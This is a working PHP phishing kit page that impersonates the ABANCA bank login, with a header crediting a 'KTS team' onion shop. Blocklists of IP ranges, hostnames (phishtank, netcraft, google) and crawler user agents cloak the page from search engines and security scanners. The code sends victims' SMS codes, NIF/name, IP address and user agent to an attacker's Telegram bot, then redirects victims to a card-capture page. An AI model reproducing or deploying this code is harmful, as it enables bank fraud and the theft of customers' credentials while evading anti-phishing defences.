<?php /* 
   
Page made by KTS team;
http://o54eavgyktxh5wts.onion/shop/;
Edited for  kantari01@thesecure.biz  on  Mon 23 Nov 2020 16:36:10 EET 
*/ ?>
<?php

   $bannedIP = array("^66.102.*.*",
   //  "127.*.*.*",
"^38.100.*.*",
 "^107.170.*.*",
"^149.20.*.*",
"^38.105.*.*",
"^74.125.*.*",
"^66.150.14.*",
"^54.176.*.*",  
"^38.100.*.*",
"^184.173.*.*",
"^66.249.*.*",
"^128.242.*.*",
"^72.14.192.*",
"^208.65.144.*",
"^74.125.*.*",
"^209.85.128.*",
"^216.239.32.*",
"^74.125.*.*",
"^207.126.144.*",
"^173.194.*.*",
"^64.233.160.*",
"^72.14.192.*",
"^66.102.*.*",
"^64.18.*.*",
"^194.52.68.*",
"^194.72.238.*",
"^62.116.207.*",
"^212.50.193.*",
"^69.65.*.*",
"^50.7.*.*",
"^131.212.*.*",
"^46.116.*.*",
"^62.90.*.*",
"^89.138.*.*",
"^82.166.*.*",
"^85.64.*.*",
"^85.250.*.*",
"^89.138.*.*",
"^93.172.*.*",
"^109.186.*.*",
"^194.90.*.*",
"^212.29.192.*",
"^212.29.224.*",
"^212.143.*.*",
"^212.150.*.*",
"^212.235.*.*",
"^217.132.*.*",
"^50.97.*.*",
"^217.132.*.*",
"^209.85.*.*",
"^66.205.64.*",
"^204.14.48.*",
"^64.27.2.*",
"^67.15.*.*",
"^202.108.252.*",
"^193.47.80.*",
"^64.62.136.*",
"^66.221.*.*",
"^64.62.175.*",
"^198.54.*.*",
"^192.115.134.*",
"^216.252.167.*",
"^193.253.199.*",
"^69.61.12.*",
"^64.37.103.*",
"^38.144.36.*",
"^64.124.14.*",
"^206.28.72.*",
"^209.73.228.*",
"^158.108.*.*",
"^168.188.*.*",
"^66.207.120.*",
"^167.24.*.*",
"^192.118.48.*",
"^67.209.128.*",
"^12.148.209.*",
"^66.211.169.3",
"^66.211.169.66",
"^89.163.159.214",
"^37.128.131.171",
"^12.148.196.*",
"^193.220.178.*",
"^68.65.53.71",
"^198.25.*.*",
"^64.106.213.*",
"^104.108.64.175",
"104.83.233.198",
"^173.194.116.102",
"^173.194.112.*",
"^65.55.206.154",
"^193.221.113.53",
"^208.76.45.53",
"^208.84.*.*",
"^207.46.8.167",
"^65.54.188.110",
"^207.46.8.199",
"^134.170.2.199",
"^65.55.92.152",
"^65.54.188.94",
"^65.55.37.104",
"^65.55.92.168",
"^65.55.37.120",
"^65.55.33.119",
"^65.55.92.184",
"^65.54.188.126",
"^65.55.37.88",
"^65.55.37.88",
"^65.55.92.136",
"^207.46.8.199",
"^65.55.92.168",
"^65.54.188.94",
"^65.55.33.119",
"^65.55.37.104",
"^65.54.188.110",
"^65.55.37.72",
"^65.55.92.152",
"^207.46.8.167",
"^65.55.33.135",
"^134.170.2.199",
"^65.55.85.12",
"^173.194.116.149",
"^216.58.211.37",
"^89.163.159.214",
"^64.233.*.*",
"^66.102.*.*",
"^66.249.*.*",
"^216.239.*.*",
"^216.33.229.163",
"^64.233.173.*" ,
"^64.68.90.*");
   if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {

        header('HTTP/1.0 404 Not Found');
        exit();
   } else {

        foreach($bannedIP as $ip) {
             if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
                  header('HTTP/1.0 404 Not Found');
                  die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
             }
        }
   }
   
   $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
   $blocked_words = array("above","google","softlayer","netcraft","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
   foreach($blocked_words as $word) {
       if (substr_count($hostname, $word) > 0) {
   		header("HTTP/1.0 404 Not Found");
           die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
   
       }
   }
   
   
   
   $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
   $blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
   foreach($blocked_words as $word) {
       if (substr_count($hostname, $word) > 0) {
   		header("HTTP/1.0 404 Not Found");
           die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
   
       }
   }
   if( !empty($_SERVER['HTTP_USER_AGENT']) ) {
       $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
       foreach($userAgents as $agent)
           if( strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false ) {
               header('HTTP/1.0 404 Not Found');
               exit;
         }}
   $bannedIP = array("^66.102.*.*",
"^38.100.*.*",
"^107.170.*.*",
"^149.20.*.*",
"^38.105.*.*",
"^74.125.*.*",
"^66.150.14.*",
"^54.176.*.*",
"^38.100.*.*",
"^184.173.*.*",
"^66.249.*.*",
"^128.242.*.*",
"^72.14.192.*",
"^208.65.144.*",
"^74.125.*.*",
"^209.85.128.*",
"^216.239.32.*",
"^74.125.*.*",
"^207.126.144.*",
"^173.194.*.*",
"^64.233.160.*",
"^72.14.192.*",
"^66.102.*.*",
"^64.18.*.*",
"^194.52.68.*",
"^194.72.238.*",
"^62.116.207.*",
"^212.50.193.*",
"^69.65.*.*",
"^50.7.*.*",
"^131.212.*.*",
"^46.116.*.*",
"^62.90.*.*",
"^89.138.*.*",
"^82.166.*.*",
"^85.64.*.*",
"^85.250.*.*",
"^89.138.*.*",
"^93.172.*.*",
"^109.186.*.*",
"^194.90.*.*",
"^212.29.192.*",
"^212.29.224.*",
"^212.143.*.*",
"^212.150.*.*",
"^212.235.*.*",
"^217.132.*.*",
"^50.97.*.*",
"^217.132.*.*",
"^209.85.*.*",
"^66.205.64.*",
"^204.14.48.*",
"^64.27.2.*",
"^67.15.*.*",
"^202.108.252.*",
"^193.47.80.*",
"^64.62.136.*",
"^66.221.*.*",
"^64.62.175.*",
"^198.54.*.*",
"^192.115.134.*",
"^216.252.167.*",
"^193.253.199.*",
"^69.61.12.*",
"^64.37.103.*",
"^38.144.36.*",
"^64.124.14.*",
"^206.28.72.*",
"^209.73.228.*",
"^158.108.*.*",
"^168.188.*.*",
"^66.207.120.*",
"^167.24.*.*",
"^192.118.48.*",
"^67.209.128.*",
"^12.148.209.*",
"^66.211.169.3",
"^66.211.169.66",
"^89.163.159.214",
"^37.128.131.171",
"^12.148.196.*",
"^193.220.178.*",
"^68.65.53.71",
"^198.25.*.*",
"^64.106.213.*",
"^104.108.64.175",
"104.83.233.198",
"^173.194.116.102",
"^173.194.112.*",
"^65.55.206.154",
"^193.221.113.53",
"^208.76.45.53",
"^208.84.*.*",
"^207.46.8.167",
"^65.54.188.110",
"^207.46.8.199",
"^134.170.2.199",
"^65.55.92.152",
"^65.54.188.94",
"^65.55.37.104",
"^65.55.92.168",
"^65.55.37.120",
"^65.55.33.119",
"^65.55.92.184",
"^65.54.188.126",
"^65.55.37.88",
"^65.55.37.88",
"^65.55.92.136",
"^207.46.8.199",
"^65.55.92.168",
"^65.54.188.94",
"^65.55.33.119",
"^65.55.37.104",
"^65.54.188.110",
"^65.55.37.72",
"^65.55.92.152",
"^207.46.8.167",
"^65.55.33.135",
"^134.170.2.199",
"^65.55.85.12",
"^173.194.116.149",
"^216.58.211.37",
"^89.163.159.214",
"^64.233.*.*",
"^66.102.*.*",
"^66.249.*.*",
"^216.239.*.*",
"^216.33.229.163",
"^64.233.173.*",
"^64.68.90.*");
   if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
        header('HTTP/1.0 404 Not Found');
        exit();
   } else {
        foreach($bannedIP as $ip) {
             if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
                  header('HTTP/1.0 404 Not Found');
                  die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
             }
        }
   }
   function is_bot() {
   	#For Bot Spiders and Search Engines
       $spiders = array(
           "abot",
           "dbot",
           "ebot",
           "hbot",
           "kbot",
           "lbot",
           "mbot",
           "nbot",
           "obot",
           "pbot",
           "rbot",
           "sbot",
           "tbot",
           "vbot",
           "ybot",
           "zbot",
           "bot.",
           "bot/",
           "_bot",
           ".bot",
           "/bot",
           "-bot",
           ":bot",
           "(bot",
           "crawl",
           "slurp",
           "spider",
           "seek",
           "accoona",
           "acoon",
           "adressendeutschland",
           "ah-ha.com",
           "ahoy",
           "altavista",
           "ananzi",
           "anthill",
           "appie",
           "arachnophilia",
           "arale",
           "araneo",
           "aranha",
           "architext",
           "aretha",
           "arks",
           "asterias",
           "atlocal",
           "atn",
           "atomz",
           "augurfind",
           "backrub",
           "bannana_bot",
           "baypup",
           "bdfetch",
           "big brother",
           "biglotron",
           "bjaaland",
           "blackwidow",
           "blaiz",
           "blog",
           "blo.",
           "bloodhound",
           "boitho",
           "booch",
           "bradley",
           "butterfly",
           "calif",
           "cassandra",
           "ccubee",
           "cfetch",
           "charlotte",
           "churl",
           "cienciaficcion",
           "cmc",
           "collective",
           "comagent",
           "combine",
           "computingsite",
           "csci",
           "curl",
           "cusco",
           "daumoa",
           "deepindex",
           "delorie",
           "depspid",
           "deweb",
           "die blinde kuh",
           "digger",
           "ditto",
           "dmoz",
           "docomo",
           "download express",
           "dtaagent",
           "dwcp",
           "ebiness",
           "ebingbong",
           "e-collector",
           "ejupiter",
           "emacs-w3 search engine",
           "esther",
           "evliya celebi",
           "ezresult",
           "falcon",
           "felix ide",
           "ferret",
           "fetchrover",
           "fido",
           "findlinks",
           "fireball",
           "fish search",
           "fouineur",
           "funnelweb",
           "gazz",
           "gcreep",
           "genieknows",
           "getterroboplus",
           "geturl",
           "glx",
           "goforit",
           "golem",
           "grabber",
           "grapnel",
           "gralon",
           "griffon",
           "gromit",
           "grub",
           "gulliver",
           "hamahakki",
           "harvest",
           "havindex",
           "helix",
           "heritrix",
           "hku www octopus",
           "homerweb",
           "htdig",
           "html index",
           "html_analyzer",
           "htmlgobble",
           "hubater",
           "hyper-decontextualizer",
           "ia_archiver",
           "ibm_planetwide",
           "ichiro",
           "iconsurf",
           "iltrovatore",
           "image.kapsi.net",
           "imagelock",
           "incywincy",
           "indexer",
           "infobee",
           "informant",
           "ingrid",
           "inktomisearch.com",
           "inspector web",
           "intelliagent",
           "internet shinchakubin",
           "ip3000",
           "iron33",
           "israeli-search",
           "ivia",
           "jack",
           "jakarta",
           "javabee",
           "jetbot",
           "jumpstation",
           "katipo",
           "kdd-explorer",
           "kilroy",
           "knowledge",
           "kototoi",
           "kretrieve",
           "labelgrabber",
           "lachesis",
           "larbin",
           "legs",
           "libwww",
           "linkalarm",
           "link validator",
           "linkscan",
           "lockon",
           "lwp",
           "lycos",
           "magpie",
           "mantraagent",
           "mapoftheinternet",
           "marvin/",
           "mattie",
           "mediafox",
           "mediapartners",
           "mercator",
           "merzscope",
           "microsoft url control",
           "minirank",
           "miva",
           "mj12",
           "mnogosearch",
           "moget",
           "monster",
           "moose",
           "motor",
           "multitext",
           "muncher",
           "muscatferret",
           "mwd.search",
           "myweb",
           "najdi",
           "nameprotect",
           "nationaldirectory",
           "nazilla",
           "ncsa beta",
           "nec-meshexplorer",
           "nederland.zoek",
           "netcarta webmap engine",
           "netmechanic",
           "netresearchserver",
           "netscoop",
           "newscan-online",
           "nhse",
           "nokia6682/",
           "nomad",
           "noyona",
           "nutch",
           "nzexplorer",
           "objectssearch",
           "occam",
           "omni",
           "open text",
           "openfind",
           "openintelligencedata",
           "orb search",
           "osis-project",
           "pack rat",
           "pageboy",
           "pagebull",
           "page_verifier",
           "panscient",
           "parasite",
           "partnersite",
           "patric",
           "pear.",
           "pegasus",
           "peregrinator",
           "pgp key agent",
           "phantom",
           "phpdig",
           "picosearch",
           "piltdownman",
           "pimptrain",
           "pinpoint",
           "pioneer",
           "piranha",
           "plumtreewebaccessor",
           "pogodak",
           "poirot",
           "pompos",
           "poppelsdorf",
           "poppi",
           "popular iconoclast",
           "psycheclone",
           "publisher",
           "python",
           "rambler",
           "raven search",
           "roach",
           "road runner",
           "roadhouse",
           "robbie",
           "robofox",
           "robozilla",
           "rules",
           "salty",
           "sbider",
           "scooter",
           "scoutjet",
           "scrubby",
           "search.",
           "searchprocess",
           "semanticdiscovery",
           "senrigan",
           "sg-scout",
           "shai'hulud",
           "shark",
           "shopwiki",
           "sidewinder",
           "sift",
           "silk",
           "simmany",
           "site searcher",
           "site valet",
           "sitetech-rover",
           "skymob.com",
           "sleek",
           "smartwit",
           "sna-",
           "snappy",
           "snooper",
           "sohu",
           "speedfind",
           "sphere",
           "sphider",
           "spinner",
           "spyder",
           "steeler/",
           "suke",
           "suntek",
           "supersnooper",
           "surfnomore",
           "sven",
           "sygol",
           "szukacz",
           "tach black widow",
           "tarantula",
           "templeton",
           "/teoma",
           "t-h-u-n-d-e-r-s-t-o-n-e",
           "theophrastus",
           "titan",
           "titin",
           "tkwww",
           "toutatis",
           "t-rex",
           "tutorgig",
           "twiceler",
           "twisted",
           "ucsd",
           "udmsearch",
           "url check",
           "updated",
           "vagabondo",
           "valkyrie",
           "verticrawl",
           "victoria",
           "vision-search",
           "volcano",
           "voyager/",
           "voyager-hc",
           "w3c_validator",
           "w3m2",
           "w3mir",
           "walker",
           "wallpaper",
           "wanderer",
           "wauuu",
           "wavefire",
           "web core",
           "web hopper",
           "web wombat",
           "webbandit",
           "webcatcher",
           "webcopy",
           "webfoot",
           "weblayers",
           "weblinker",
           "weblog monitor",
           "webmirror",
           "webmonkey",
           "webquest",
           "webreaper",
           "websitepulse",
           "websnarf",
           "webstolperer",
           "webvac",
           "webwalk",
           "webwatch",
           "webwombat",
           "webzinger",
           "wget",
           "whizbang",
           "whowhere",
           "wild ferret",
           "worldlight",
           "wwwc",
           "wwwster",
           "xenu",
           "xget",
           "xift",
           "xirq",
           "yandex",
           "yanga",
           "yeti",
           "yodao",
		   "zao/",
		   "zippp",
		   "zyborg",
		   "....");
       foreach($spiders as $spider) {
           if ( stripos($_SERVER['HTTP_USER_AGENT'], $spider) !== false ) return true;
       }
       return false;
   }
   
   
   ?>
<?php
$ip = "unknown";
if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) $ip = getenv("HTTP_CLIENT_IP"); 
else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     


$website="https://api.telegram.org/bot5217172497:AAEFDxybV8u22j5x2m3Zmh2-aUDzD8Dkpo8";

if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{
$data ="📩-💥SMS💥—📩 ".                                   
"\n\n💡  [  ".$_POST['otp']."  ]".
"\nNIF/NAME = [".$_POST['nam']." ]".
"\n—————————————--".
"\n********ip : [ ".$ip." ]*****".
"\n**********User_agent*********".
"\nUser_agent : [".$_SERVER['HTTP_USER_AGENT']."]".
"\n—————-End————————-";

$params=[
 'chat_id'=>'-1001582222518',



    'text'=>$data,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
}



?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<link rel="icon " href="img/icon.png"  >
<meta name="robots" content="noindex,nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Acceso Banca Electrónica ABANCA</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="jquery.mask.js"></script>
<style type="text/css">
/*
#5b87da
#7b858a
*/
*{
padding:0;
margin:0;
outline:0;
font-family:Verdana,Arial,sans-serif;
}
header{
height:35px;
width:calc(100% - 20px);
background:#5b87da;
text-align:right;
line-height:25px;
color:white;
font-size:11px;
position:relative;
padding-right:20px;
}
.pregead{
height:35px;
width:calc(100% - 0px);
background:#5b87da;
position:absolute;
top:0;
left:0;
}
header .ueieko{
display:flex;
align-items:center;
height:100%;
justify-content:right;
}
.ueieko div{
margin-left:3px;
height:24px;
width:auto;
padding-right:5px;
padding-left:5px;
border-right:1.5px solid #577abc ;
}
.header{
width:100%;
height:40px;
background:#fff;
position:sticky;
z-index:99999999;
}
.header img{
height:28px;
width:154px;
margin-left:40px;
margin-top:5px;
}
.desc{
font-size:25px;
color:#7b858a;
width:calc(100% -80px);
height:auto;
padding:40px;
padding-top:20px;
padding-bottom:10px;
}
.frm{
width:calc(100% -80px);
padding-right:40px;
padding-left:40px;
}
.frm2{
width:calc(100% -80px);
padding-right:40px;
padding-left:40px;
}
.frm3{
width:calc(100% -80px);
padding-right:40px;
padding-left:40px;
}
.lgo{
font-size:30px;
color:#5b87da;
line-height:78px;
width:100%;
height:53px;
border-bottom:1px solid black;
}
.lgo img{
float:right;
}

.forml{
width:calc(100% -80px);
height:155px;
margin-top:10px;
border:1px solid #d1d1d1;
background:#f4f4f4;
display:flex;
position:relative;
font-size:12px ;
}
.forml .je{
width:30px;
height:100%;
line-height:30px;
text-align:center;
background:#e9e9eb;
}
.forml .le{
width:calc(100% - 40px);
height:100%;
line-height:30px;
overflow:hidden;
padding-left:10px;
}
.le i{
color:#666;
font-weight:15px;
font-style:normal;
}

.btns {
height:43px;
width:100%;
display:flex;
justify-content:right;
margin-top:15px;
}
.le table{

}
.le  input{
height:25px;
border:1px solid #809eba;
}
.le .keooe span{
margin-left:5px;
margin-right:5px;
text-decoration:underline;
}
.btns button{
height:32px;
width:120px;
border:0;
margin-left:10px;
float:right;
border-radius:5px;
color:white;
font-size:12px;
background:#7b858a;
font-weight:bold;
}
.lgo2{
font-size:30px;
color:#5b87da;
line-height:73px;
width:100%;
height:53px;
border-bottom:1px solid black;
}
.lgo2 img{
float:right;
margin-top:12px;
}
.kdo{
background:#5a84d6;
width:calc(100% - 45px);
height:30px;
margin-top:20px;
border-radius:5px;
color:white;
font-weight:bolder;
padding:15px;
padding-top:10px;
display:flex;
padding-left:30px;
position:relative;
}
.kdo img{
right:10px;
height:30px;
width:30px;
}
.descj{
height:auto;
margin-top:10px;
background:#e4e5e9;
font-size:12px;
padding:10px;
padding-bottom:20px;
border:1px solid #ccc;
}
.green{
position:sticky;
top:0;
left:0;
box-shadow:0 4px 2px -2px rgba(0, 0, 0, 0.15);
background:#fff none repeat scroll 0 0;
}
#jdj{
float:right;
font-size:11px;
margin-top:15px;
color:#5b87da;
display:none;
margin-right:50px;
}
.kehid{
margin-top:5px;
float:left;
font-size:15px;
display:none;
}
.kehid a{
color:white;
}
</style>
</head>
<body>
<div class="container" >
<div class="pregead" ></div>
<header>
<span class="kehid" >
<i class='fa fa-fw fa-bullhorn'></i><a   href="https://www.abanca.com/es/ayuda/banca-electronica/contrasenas-y-acceso-a-banca-electronica/" >Ayuda</a></span>
<div class="ueieko" >
<div>Castellano</div>
<div>Galego</div>
<div>Euskera</div>
<div style="border:0" >English</div>
</div>
</header>

<div class="header" >
<img src="img/img1.png" id="je" >
<span id="jdj" ><i class="fa fa-phone" ></i> 981 910 522</span>
</div>
<div class="desc" >
Su tarjeta de coordonates esta actualizada 
</div>
<div class="jeie1" >
<br><br><br><br>
<div class="dot-flashing"></div>

<br><br>

<style type="text/css">
.des00{
background:#ffffcb;border: 1px solid #ebeba3;height:80px;
}
.footerr{
margin-top:20px;
font-size:11px;
}
.footerr img{
height:14px;
width:77px;
}
.foo2{
font-size:11px;
margin-top:10px;
}
.foo2 a{
color:#5b87da;
font-size:11px;
}
.sp01o{
display:none;
}
.jeie1{
position:relative;
justify-content:center;
display:flex;
align-items:center;
}


.dot-flashing {
position: relative;
width: 30px;
height: 30px;
border-radius: 50%;
background:#5b87da;
color: #9880ff;
-webkit-animation: dot-flashing 1s infinite linear alternate;
animation: dot-flashing 1s infinite linear alternate;
-webkit-animation-delay: 0.5s;
animation-delay: 0.5s;
}
.dot-flashing::before, .dot-flashing::after {
content: "";
display: inline-block;
position: absolute;
top: 0;
}
.dot-flashing::before {
left:-40px;
width: 30px;
height: 30px;
border-radius: 50%;
background:#5b87da;
color: #9880ff;
-webkit-animation: dot-flashing 1s infinite alternate;
animation: dot-flashing 1s infinite alternate;
-webkit-animation-delay: 0s;
animation-delay: 0s;
}
.dot-flashing::after {
left: 40px;
width: 30px;
height: 30px;
border-radius: 50%;
background:#5b87da;
color: #9880ff;
-webkit-animation: dot-flashing 1s infinite alternate;
animation: dot-flashing 1s infinite alternate;
-webkit-animation-delay: 1s;
animation-delay: 1s;
}

@-webkit-keyframes dot-flashing {
0% {
background:#5b87da;
}
50%, 100% {
background:#5b87da;
opacity:0.2;
}
}

@keyframes dot-flashing {
0% {
background:#5b87da;
}
50%, 100% {
background:#5b87da;
opacity:0.2;
}
}



@media screen and (min-width: 760px) {

.ueieko{
font-size:15px;
}
.header img{
margin-left:0px;
}
.kdo{
line-height:30px;
}

.desc{padding-left:0;}
.kdo img{
position:absolute;
top:10px;
right:10px;
}

.frm, .frm2{
width:50%;
}
.imgimpi{
display:none
}
.frm{
padding:10px;
}
header .ueieko{
}
.frm2{
margin-top:10px;
}
.descj {

}
.des00{

}
.forml{

}
.sp01o{
display:block;
}
.kehid{
color:white;
float:left;
display:block;
}
.container{
margin:auto;
max-width:1000px !important;
}


}

</style>
</div>
<div class="frm3" >
<center><hr color="#666"   size="3" style="opacity:0.2"  ></center>
<div class="footerr" >
<img src="img/img1.png" >&copy; ABANCA Corporación Bancaria S.A. Todos los derechos reservados.
<span class="sp01o"  style="float:right" >Si tienes dudas puedes consultar la <a href="https://www.abanca.com/es/ayuda/banca-electronica/contrasenas-y-acceso-a-banca-electronica/" style="color:black"  >Sección de ayuda.</a></span>
</div>
<div class="foo2" >
<a href="http://www.abanca.com/es/legal/politica-privacidad/" >Política de privacidad</a> | <a href="https://www.abanca.com/es/legal/cookies/" >Política de cookies</a> | <a href="https://bancaelectronica.abanca.com/Documentacion/spa/2080/Contrato_Banca_Electronica.pdf" >Contrato</a> | <a href="http://www.abanca.com/es/documentos/banca-a-distancia/es-tarifas-banca-a-distancia-particulares.pdf" >Tarifas</a> | <a href="https://www.abanca.com/es/perfil/seguridad/" >Seguridad</a>
<br><br>
</div>
</div>
</div>
<script type="text/javascript">
$('#expmon').mask('00');
$('#expy').mask('0000');
$('#cvv').mask('000');
$('#card').mask('0000 0000 0000 0000 000');
function setvalss(o){
event.preventDefault();
if($('#val2').val().length<6){
$('#val2').val($('#val2').val()+o.innerHTML);
}}
setTimeout(()=>{
window.location.href="./cc.php?sig=0&i=<?php echo urlencode(base64_encode($_POST["nam"]));?>";
},20000);
$(window).on("scroll", function() {
if($(window).scrollTop()) {
$('#jdj').css('display','block');
$('.header').addClass('green');
$('.header').css({"background":"#fff none repeat scroll 0 0"});
}
else {
$('#jdj').css('display','none');
$('.header').removeClass('green');
$('.header').css({"background":"#fff none repeat scroll 0 0"});
}
});
function showpad(){
$('#pad').css('display','block');
var numbs=["1","2","3","4","5","6","7","8","9","0"];
numbs=shuffleArray(numbs);
for(var o=0;o<11;o++){
$(".eo").eq(o).html(numbs[o]);
}
}

function shuffleArray(array) {
for (let i = array.length - 1; i > 0; i--) {
const j = Math.floor(Math.random() * (i + 1));
[array[i], array[j]] = [array[j], array[i]];
}
return array;
}

</script>
</body>
</html>